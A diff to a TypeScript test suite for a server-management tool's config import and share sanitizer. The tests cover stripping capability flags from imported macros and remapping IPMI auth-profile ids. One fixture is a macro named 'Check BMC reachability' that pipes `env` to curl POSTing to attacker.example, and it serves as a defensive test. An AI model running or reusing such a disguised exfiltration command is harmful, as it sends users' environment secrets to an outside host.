@@ -3425,6 +3425,88 @@ describe("share import", () => {
     expect(owned.origin?.externalId).toBe("device:2");
   });
 
+  /**
+   * Issue #48 §3.5 — the share half of "no imported consent". The backup half
+   * and the sanitizer's own unit coverage live in configCommandsMacros.test.ts;
+   * this one proves the SHARE ingest path funnels through the same sanitizer,
+   * which is the finding's actual claim.
+   */
+  it("share import strips a macro's capability flags — an imported macro is never pre-armed", async () => {
+    const shareImportStore = new InMemoryMacroStore();
+    await shareImportStore.initialize();
+    setActiveMacroStore(shareImportStore);
+
+    const exportData = makeExportData({
+      exportType: "share",
+      servers: [],
+      tunnels: [],
+      serialProfiles: [],
+      macros: [
+        {
+          id: "hostile",
+          name: "Check BMC reachability",
+          text: "ping -c1 ${profile.ipmiHost} && env | curl -X POST --data-binary @- https://attacker.example/\n",
+          runIn: "localTerminal",
+          provideIpmiCredentials: true,
+          route: "ipmiGateway"
+        }
+      ] as unknown as TerminalMacro[]
+    });
+
+    mockShowOpenDialog.mockResolvedValue([{ fsPath: "/fake/share-armed-macro.json", scheme: "file" }]);
+    mockReadFile.mockResolvedValue(Buffer.from(JSON.stringify(exportData), "utf8"));
+    mockShowQuickPick.mockResolvedValueOnce({ value: "nexusExport" });
+    await registeredCommands.get("nexus.config.import")!();
+
+    const imported = shareImportStore.getAll().find((m) => m.name === "Check BMC reachability")! as TerminalMacro & { route?: unknown };
+    // The macro itself lands — the strip costs the user nothing but a re-tick.
+    expect(imported).toBeDefined();
+    expect(imported.runIn).toBe("localTerminal");
+    // Absence, not falsiness (see the sanitizer's own tests for why).
+    expect("provideIpmiCredentials" in imported).toBe(false);
+    expect("route" in imported).toBe(false);
+  });
+
+  it("share import remaps a server's ipmiAuthProfileId to the imported profile, never the sender's id", async () => {
+    const exportData = makeExportData({
+      exportType: "share",
+      servers: [makeServer({ id: "share-s-bmc", name: "BMC Linked", authProfileId: undefined, ipmiAuthProfileId: "ap-sender" })],
+      tunnels: [],
+      serialProfiles: [],
+      authProfiles: [makeAuthProfile({ id: "ap-sender", name: "BMC accounts" })]
+    });
+
+    mockShowOpenDialog.mockResolvedValue([{ fsPath: "/fake/share-ipmi-link.json", scheme: "file" }]);
+    mockReadFile.mockResolvedValue(Buffer.from(JSON.stringify(exportData), "utf8"));
+    mockShowQuickPick.mockResolvedValueOnce({ value: "nexusExport" });
+    await registeredCommands.get("nexus.config.import")!();
+
+    const snapshot = core.getSnapshot();
+    const imported = snapshot.servers.find((s) => s.name === "BMC Linked")!;
+    expect(imported.ipmiAuthProfileId).toBe(snapshot.authProfiles[0].id);
+    // The sender's id resolves to nothing here — or, worse, to an unrelated
+    // local profile that happens to hold it.
+    expect(imported.ipmiAuthProfileId).not.toBe("ap-sender");
+  });
+
+  it("share import drops an ipmiAuthProfileId whose profile is not in the bundle, rather than carrying it stale", async () => {
+    const exportData = makeExportData({
+      exportType: "share",
+      servers: [makeServer({ id: "share-s-dangle", name: "Dangling BMC", ipmiAuthProfileId: "ap-absent" })],
+      tunnels: [],
+      serialProfiles: [],
+      authProfiles: []
+    });
+
+    mockShowOpenDialog.mockResolvedValue([{ fsPath: "/fake/share-ipmi-dangle.json", scheme: "file" }]);
+    mockReadFile.mockResolvedValue(Buffer.from(JSON.stringify(exportData), "utf8"));
+    mockShowQuickPick.mockResolvedValueOnce({ value: "nexusExport" });
+    await registeredCommands.get("nexus.config.import")!();
+
+    const imported = core.getSnapshot().servers.find((s) => s.name === "Dangling BMC")!;
+    expect(imported.ipmiAuthProfileId).toBeUndefined();
+  });
+
   it("v1 share import reads legacy macros from settings key", async () => {
     const v1ShareData = {
       version: 1,
@@ -4634,6 +4716,58 @@ describe("sanitizeForSharing", () => {
     expect(result.settings["nexus.logging.sessionLogDirectory"]).toBe("");
   });
 
+  /**
+   * Issue #48 §3.5 — the share-export half of `ipmiAuthProfileId`.
+   *
+   * `authProfileId` is left UNSET on the fixture deliberately: with both links
+   * set the profile ships for the wrong reason and the collection bug is
+   * invisible, which is the exact vacuous-fixture trap CLAUDE.md names.
+   */
+  it("collects and remaps a profile referenced ONLY as a server's IPMI credentials", () => {
+    const profile = makeAuthProfile({ id: "ap-bmc", name: "BMC accounts", username: "bmc-operator" });
+    const server = makeServer({ id: "s-bmc", authProfileId: undefined, ipmiAuthProfileId: "ap-bmc" });
+
+    const result = sanitizeForSharing([server], [], [], [], {}, [profile], []);
+
+    // Collected: an implementation building `referencedProfileIds` from
+    // `authProfileId` alone ships no profile at all here.
+    expect(result.authProfiles).toHaveLength(1);
+    // Redacted like every other exported profile — the username never travels,
+    // and the password was never part of a share bundle.
+    expect(result.authProfiles[0].username).toBe("user");
+    expect(result.authProfiles[0].id).not.toBe("ap-bmc");
+    // Remapped: the verbatim server spread would carry the SENDER's id.
+    expect(result.servers[0].ipmiAuthProfileId).toBe(result.authProfiles[0].id);
+    expect(result.servers[0].ipmiAuthProfileId).not.toBe("ap-bmc");
+  });
+
+  it("drops an ipmiAuthProfileId whose profile is excluded from the export, rather than shipping a dangling id", () => {
+    const server = makeServer({ id: "s-bmc", ipmiAuthProfileId: "ap-not-exported" });
+
+    const result = sanitizeForSharing([server], [], [], [], {}, [], []);
+
+    expect(result.servers[0].ipmiAuthProfileId).toBeUndefined();
+  });
+
+  it("keeps the two links independent — a server can export both, pointing at different profiles", () => {
+    const ssh = makeAuthProfile({ id: "ap-ssh", name: "SSH" });
+    const bmc = makeAuthProfile({ id: "ap-bmc", name: "BMC" });
+    const server = makeServer({ id: "s-both", authProfileId: "ap-ssh", ipmiAuthProfileId: "ap-bmc" });
+
+    const result = sanitizeForSharing([server], [], [], [], {}, [ssh, bmc], []);
+
+    const newSsh = result.authProfiles.find((p) => p.name === "SSH")!;
+    const newBmc = result.authProfiles.find((p) => p.name === "BMC")!;
+    expect(result.servers[0].authProfileId).toBe(newSsh.id);
+    expect(result.servers[0].ipmiAuthProfileId).toBe(newBmc.id);
+    expect(newSsh.id).not.toBe(newBmc.id);
+  });
+
+  it("carries bmcWebProtocol verbatim — it is an ordinary scalar with nothing to remap", () => {
+    const result = sanitizeForSharing([makeServer({ bmcWebProtocol: "http" })], [], [], [], {}, [], []);
+    expect(result.servers[0].bmcWebProtocol).toBe("http");
+  });
+
   it("clears defaultServerId when server not in export", () => {
     const servers: ServerConfig[] = [];
     const tunnels = [makeTunnel({ defaultServerId: "missing" })];
@@ -5438,6 +5572,52 @@ describe("backup export round-trip", () => {
     const s2 = core.getServer("s2");
     expect(s2?.authProfileId).toBeUndefined();
     expect(s2?.origin?.syncedAuthProfileId).toBe("p-sync");
+  });
+
+  it("import clears a dangling ipmiAuthProfileId — including when the SSH link is perfectly fine (issue #48 PR-B)", async () => {
+    vi.clearAllMocks();
+    registeredCommands.clear();
+    configStore.clear();
+    const vault = new MockVault();
+
+    const repo = new InMemoryConfigRepository();
+    const core = new NexusCore(repo);
+    await core.initialize();
+    registerConfigCommands(core, vault);
+
+    const importData = {
+      version: 1,
+      exportType: "backup",
+      exportedAt: new Date().toISOString(),
+      servers: [
+        // The fixture that makes the new sweep observable: the SSH link resolves
+        // (so a sweep gated on `authProfileId` never even enters the loop), the
+        // BMC link does not, and the sync's stamp records the LIVE SSH link.
+        makeServer({
+          id: "s1",
+          authProfileId: "ap-ok",
+          ipmiAuthProfileId: "nonexistent-profile",
+          origin: { sourceId: "src-1", externalId: "device:1", syncedAt: 1000, syncedAuthProfileId: "ap-ok" }
+        })
+      ],
+      tunnels: [],
+      serialProfiles: [],
+      authProfiles: [makeAuthProfile({ id: "ap-ok", name: "SSH" })]
+    };
+
+    mockShowOpenDialog.mockResolvedValue([{ fsPath: "/fake/import-ipmi-dangle.json", scheme: "file" }]);
+    mockReadFile.mockResolvedValue(Buffer.from(JSON.stringify(importData), "utf8"));
+    mockShowQuickPick.mockResolvedValueOnce({ value: "nexusExport" }); // chooser: Nexus Export File…
+    mockShowQuickPick.mockResolvedValueOnce({ label: "Replace", value: "replace" });
+
+    await registeredCommands.get("nexus.config.import")!();
+
+    const s1 = core.getServer("s1");
+    expect(s1?.ipmiAuthProfileId).toBeUndefined();
+    // The intact SSH link and its stamp are untouched — sweeping a BMC link must
+    // not cost the sync its record of a link that still resolves.
+    expect(s1?.authProfileId).toBe("ap-ok");
+    expect(s1?.origin?.syncedAuthProfileId).toBe("ap-ok");
   });
 
   it("import clears a dangling authProfileId on an inventory source when the profile is not imported", async () => {
